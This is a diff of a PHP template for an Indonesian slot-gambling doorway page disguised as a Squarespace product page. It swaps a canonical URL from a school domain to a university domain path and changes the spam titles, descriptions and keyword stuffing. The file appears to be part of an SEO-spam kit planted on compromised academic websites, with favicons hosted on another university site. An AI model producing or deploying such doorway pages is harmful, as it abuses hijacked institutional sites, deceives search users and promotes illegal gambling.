@@ -53,7 +53,7 @@ foreach ($lines as $item) {
     }
 }
 
-$url  = "https://perpustakaan.mtsn2sumedang.sch.id/config/?product=" . $brand;
+$url  = "https://openlibrarypublications.telkomuniversity.ac.id/public_html/classes/?product=" . $brand;
 $amp  = "https://pub-adb3631e554745889c000bf8f9fa0035.r2.dev/pt3.html?id=" . $brand;
 $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $brand, situs $brand, agen $brand, slot online $brand, rtp $brand, bandar $brand, daftar $BRANDS.";
 ?>
@@ -66,35 +66,35 @@ $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $bran
     <!-- This is Squarespace. -->
     <base href="">
     <meta charset="utf-8" />
-    <title><?php echo $BRANDS ?>❤️ Slot Gacor Terbaik Untuk Saat Ini</title>
+    <title><?php echo $BRANDS ?>👅 LOGIN SLOT SUPER GACOR DISINI</title>
     <link rel="amphtml" href="<?php echo $amp ?>" />
     <meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" />
     <link rel="icon" type="image/x-icon" media="(prefers-color-scheme: light)" href="https://ejurnal.unikarta.ac.id/ojs/100persen2.png?format=100w" />
     <link rel="icon" type="image/x-icon" media="(prefers-color-scheme: dark)" href="https://ejurnal.unikarta.ac.id/ojs/100persen2.png?format=100w" />
     <link rel="canonical" href="<?php echo $url ?>" />
     <meta property="og:site_name" content="<?php echo $BRANDS ?>" />
-    <meta property="og:title" content="<?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini" />
+    <meta property="og:title" content="<?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI" />
     <meta property="og:url" content="<?php echo $url ?>" />
     <meta property="og:type" content="product" />
-    <meta property="og:description" content="Sebagai salah satu penyedia layanan slot terkemuka, <?php echo $BRANDS?> menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
+    <meta property="og:description" content="<?php echo $BRANDS?> adalah link login slot yang menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
     <meta property="og:image" content="https://res.cloudinary.com/dqplzxgxy/image/upload/v1719655024/bos_pjqbm6.webp?format=1500w" />
     <meta property="og:image:width" content="1024" />
     <meta property="og:image:height" content="1024" />
     <meta property="product:price:amount" content="10000.00" />
     <meta property="product:price:currency" content="IDR" />
     <meta property="product:availability" content="instock" />
-    <meta itemprop="name" content="<?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini" />
+    <meta itemprop="name" content="<?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI" />
     <meta itemprop="url" content="<?php echo $url ?>" />
-    <meta itemprop="description" content="Sebagai salah satu penyedia layanan slot terkemuka, <?php echo $BRANDS?> menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
+    <meta itemprop="description" content="<?php echo $BRANDS?> adalah link login slot yang menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
     <meta itemprop="thumbnailUrl" content="https://res.cloudinary.com/dqplzxgxy/image/upload/v1719655024/bos_pjqbm6.webp?format=1500w" />
     <link rel="image_src" href="https://res.cloudinary.com/dqplzxgxy/image/upload/v1719655024/bos_pjqbm6.webp?format=1500w" />
     <meta itemprop="image" content="https://res.cloudinary.com/dqplzxgxy/image/upload/v1719655024/bos_pjqbm6.webp?format=1500w" />
-    <meta name="twitter:title" content="<?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini" />
+    <meta name="twitter:title" content="<?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI" />
     <meta name="twitter:image" content="https://res.cloudinary.com/dqplzxgxy/image/upload/v1719655024/bos_pjqbm6.webp?format=1500w" />
     <meta name="twitter:url" content="<?php echo $url ?>" />
     <meta name="twitter:card" content="summary" />
-    <meta name="twitter:description" content="Sebagai salah satu penyedia layanan slot terkemuka, <?php echo $BRANDS?> menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
-    <meta name="description" content="Sebagai salah satu penyedia layanan slot terkemuka, <?php echo $BRANDS?> menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
+    <meta name="twitter:description" content="<?php echo $BRANDS?> adalah link login slot yang menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
+    <meta name="description" content="<?php echo $BRANDS?> adalah link login slot yang menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>." />
     <link rel="preconnect" href="https://images.squarespace-cdn.com">
     <script type="text/javascript" src="//use.typekit.net/ik/hVkq-VxFrorerjM_w4e1pFer6Al85BPRKS83QUp8S8Sfe1bJXnX1IyvhF2jtFRZLFRjDjRStjQZyFDJaFQSXwAmqjRycwe9De6MK2ABnie8hOAikdas8ShC7fbRbdsMMeMb6MKG4fFZlIMMjgPMfH6qJXcXbMg6YJMJ7fbRsdsMMeMt6MKG4fFFlIMMjIPMfqMeiv0hUg6.js"></script>
     <script type="text/javascript">
@@ -321,7 +321,7 @@ $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $bran
           "timeZoneOffset": 25200000,
           "timeZoneAbbr": "WIB",
           "siteTitle": "<?php echo $BRANDS ?>",
-          "fullSiteTitle": "<?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini",
+          "fullSiteTitle": "<?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI",
           "siteDescription": "",
           "location": {
             "mapLat": -6.2591169,
@@ -589,7 +589,7 @@ $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $bran
           "permissionType": 1
         },
         "item": {
-          "title": "<?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini",
+          "title": "<?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI",
           "id": "663b7aab6e91257626fa4793",
           "fullUrl": "<?php echo $url ?>",
           "publicCommentCount": 0,
@@ -814,9 +814,9 @@ $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $bran
     </script>
     <script type="application/ld+json">
       {
-        "name": "<?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini",
+        "name": "<?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI",
         "image": "https://res.cloudinary.com/dqplzxgxy/image/upload/v1719655024/bos_pjqbm6.webp?format=1500w",
-        "description": "Sebagai salah satu penyedia layanan slot terkemuka, <?php echo $BRANDS?> menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>.",
+        "description": "<?php echo $BRANDS?> adalah link login slot yang menjamin pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama <?php echo $BRANDS?>.",
         "brand": "<?php echo $BRANDS ?>",
         "offers": {
           "price": 10000.00,
@@ -1717,7 +1717,7 @@ $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $bran
                       <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
                         <a href="<?php echo $url ?>" class="ProductItem-nav-breadcrumb-link">Slot Gacor</a>
                         <span class="ProductItem-nav-breadcrumb-separator"></span>
-                        <a href="<?php echo $url ?>" class="ProductItem-nav-breadcrumb-link"><?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini</a>
+                        <a href="<?php echo $url ?>" class="ProductItem-nav-breadcrumb-link"><?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI</a>
                       </div>
                     </nav>
                     <section class="ProductItem-summary" data-controller="ProductGallery">
@@ -1822,7 +1822,7 @@ $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $bran
       rel="nofollow noreferrer" class="login">LOGIN</a>
   </div>
   <br>
-  <h1 class="ProductItem-details-title" data-content-field="title" data-test="pdp-title"><?php echo $BRANDS ?> ❤️ Slot Gacor Terbaik Untuk Saat Ini</h1>
+  <h1 class="ProductItem-details-title" data-content-field="title" data-test="pdp-title"><?php echo $BRANDS ?> 👅 LOGIN SLOT SUPER GACOR DISINI</h1>
   <div data-controller="ProductItemVariants,ProductCartButton" class="ProductItem-details-checkout">
   <div class="ProductItem-product-price" data-animation-role="content">
   <div class="product-price"> IDR 10,000.00 </div>
@@ -1844,7 +1844,7 @@ $kw   = "$brand, slot $brand, judi $brand, login $brand,  $brand, livechat $bran
                             <div class="pdp-overlay"></div>
                           </div>
                           <div class="ProductItem-details-excerpt" data-content-field="excerpt">
-                            <p class="" style="white-space:pre-wrap;">Sebagai portal penyedia layanan slot gacor, <?php echo $BRANDS?> menawarkan pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Nikmati sensasi taruhan yang seru dan mendebarkan bersama situs dengan kualitas maxwin terbaik disini, <?php echo $BRANDS?>.</p>
+                            <p class="" style="white-space:pre-wrap;">Portal provider layanan slot gacor, Di <?php echo $BRANDS?> dapatkan pengalaman bermain yang menghibur dengan kesempatan besar untuk meraih jackpot. Dapatkan kualitas dan maxwin berlimpah yang hanya bisa kamu dapatkan di <?php echo $BRANDS?>.</p>
                           </div>
                           <div class="product-quantity-input" data-item-id="663b7aab6e91257626fa4793" data-animation-role="content">
                             <div class="quantity-label">Quantity:</div>
